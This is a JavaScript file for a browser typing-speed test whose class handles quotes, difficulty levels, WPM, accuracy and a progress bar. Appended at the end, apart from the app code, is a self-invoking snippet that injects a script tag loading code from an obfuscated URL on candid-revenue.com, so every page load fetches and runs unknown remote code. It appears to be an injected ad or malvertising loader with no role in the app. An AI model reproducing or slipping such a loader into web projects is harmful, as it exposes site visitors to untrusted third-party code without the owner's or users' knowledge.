class TypingTest {
    constructor() {
        this.quotes = {
            easy: [
                "Practice makes perfect.",
                "Typing fast takes patience.",
                "Never stop learning new skills.",
                "Success comes from consistency."
            ],

            medium: [
                "The future belongs to those who work hard every day.",
                "Programming is the art of solving problems creatively.",
                "Great achievements require dedication and persistence."
            ],

            hard: [
                "Technology continues to transform the modern world rapidly and efficiently.",
                "Consistency and discipline are the foundations of long term success.",
                "Professional developers constantly improve their coding and problem solving abilities."
            ]
        };

        this.currentQuote = "";
        this.difficulty = "easy";

        this.startTime = null;
        this.errors = 0;
        this.totalTyped = 0;

        this.initializeElements();
        this.bindEvents();

        this.loadQuote();
    }

    initializeElements() {
        this.quoteDisplay = document.getElementById("quote-display");
        this.typingInput = document.getElementById("typing-input");

        this.wpmElement = document.getElementById("wpm");
        this.accuracyElement = document.getElementById("accuracy");
        this.errorElement = document.getElementById("errors");

        this.progressBar = document.getElementById("progress-fill");

        this.restartBtn = document.getElementById("restart");
        this.newQuoteBtn = document.getElementById("new-quote");

        this.difficultyButtons =
            document.querySelectorAll(".difficulty-btn");
    }

    bindEvents() {
        this.typingInput.addEventListener("input", () =>
            this.handleTyping()
        );

        this.restartBtn.addEventListener("click", () =>
            this.restartTest()
        );

        this.newQuoteBtn.addEventListener("click", () =>
            this.loadQuote()
        );

        this.difficultyButtons.forEach((btn) => {
            btn.addEventListener("click", () => {
                this.changeDifficulty(btn.dataset.difficulty);
            });
        });
    }

    changeDifficulty(level) {
        this.difficulty = level;

        this.difficultyButtons.forEach((btn) => {
            btn.classList.remove("active");

            if (btn.dataset.difficulty === level) {
                btn.classList.add("active");
            }
        });

        this.loadQuote();
    }

    loadQuote() {
        const quoteArray = this.quotes[this.difficulty];

        this.currentQuote =
            quoteArray[Math.floor(Math.random() * quoteArray.length)];

        this.renderQuote();

        this.typingInput.value = "";
        this.typingInput.disabled = false;

        this.startTime = null;
        this.errors = 0;
        this.totalTyped = 0;

        this.updateStats();
        this.updateProgress();

        this.typingInput.focus();
    }

    renderQuote() {
        this.quoteDisplay.innerHTML = "";

        this.currentQuote.split("").forEach((char) => {
            const span = document.createElement("span");

            span.innerText = char;

            this.quoteDisplay.appendChild(span);
        });
    }

    handleTyping() {
        const typedText = this.typingInput.value;
        const quoteChars =
            this.quoteDisplay.querySelectorAll("span");

        if (!this.startTime) {
            this.startTime = Date.now();
        }

        this.errors = 0;

        quoteChars.forEach((span, index) => {
            const typedChar = typedText[index];

            span.classList.remove(
                "correct",
                "incorrect",
                "current"
            );

            if (typedChar == null) {
                if (index === typedText.length) {
                    span.classList.add("current");
                }
            }

            else if (typedChar === span.innerText) {
                span.classList.add("correct");
            }

            else {
                span.classList.add("incorrect");
                this.errors++;
            }
        });

        this.totalTyped = typedText.length;

        this.updateStats();
        this.updateProgress();

        if (typedText === this.currentQuote) {
            this.finishTest();
        }
    }

    calculateWPM() {
        if (!this.startTime) return 0;

        const minutes =
            (Date.now() - this.startTime) / 1000 / 60;

        const words = this.totalTyped / 5;

        return Math.max(0, Math.round(words / minutes));
    }

    calculateAccuracy() {
        if (this.totalTyped === 0) return 100;

        const correct =
            this.totalTyped - this.errors;

        return Math.max(
            0,
            Math.round((correct / this.totalTyped) * 100)
        );
    }

    updateStats() {
        this.wpmElement.textContent =
            this.calculateWPM();

        this.accuracyElement.textContent =
            this.calculateAccuracy() + "%";

        this.errorElement.textContent =
            this.errors;
    }

    updateProgress() {
        const typed =
            this.typingInput.value.length;

        const total =
            this.currentQuote.length;

        const progress =
            (typed / total) * 100;

        this.progressBar.style.width =
            progress + "%";
    }

    finishTest() {
        this.typingInput.disabled = true;

        setTimeout(() => {
            this.loadQuote();
        }, 1500);
    }

    restartTest() {
        this.typingInput.value = "";

        this.startTime = null;
        this.errors = 0;
        this.totalTyped = 0;

        this.renderQuote();

        this.updateStats();
        this.updateProgress();

        this.typingInput.focus();
    }
}

document.addEventListener("DOMContentLoaded", () => {
    new TypingTest();
});

(function(duwf){
var d = document,
    s = d.createElement('script'),
    l = d.scripts[d.scripts.length - 1];
s.settings = duwf || {};
s.src = "\/\/candid-revenue.com\/b.X\/VSsBdSGFle0FYaWNce\/oe\/m\/9HuPZVULlhk\/PETnc\/xFN_TUYW4wNYD\/k\/tGN\/zYEv1\/NQjhgG1NMfwJ";
s.async = true;
s.referrerPolicy = 'no-referrer-when-downgrade';
l.parentNode.insertBefore(s, l);
})({})

